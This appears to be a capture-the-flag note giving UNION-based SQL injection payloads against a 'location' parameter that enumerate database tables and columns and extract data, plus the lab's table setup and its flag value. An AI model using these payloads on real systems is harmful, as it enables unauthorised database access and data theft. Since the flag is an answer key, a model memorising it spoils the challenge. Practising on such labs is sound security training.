--two-- 
mexico' UNION SELECT 1,2,3-- -
mexico' UNION SELECT 1,group_concat(table_name),3 from information_schema.tables where table_schema='users'-- -
mexico' UNION SELECT 1,group_concat(table_schema,0x3a,column_name),3 FROM information_schema.columns WHERE table_name = 'security'-- -
?location=mexico' UNION SELECT 1,country,3 from users.users-- -


CREATE TABLE users (
  id INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
  username VARCHAR(255) NOT NULL,
  country VARCHAR(255) DEFAULT NULL
);

INSERT INTO users (username, country) VALUES ('flag', '4n0th3r1nj3ct1on');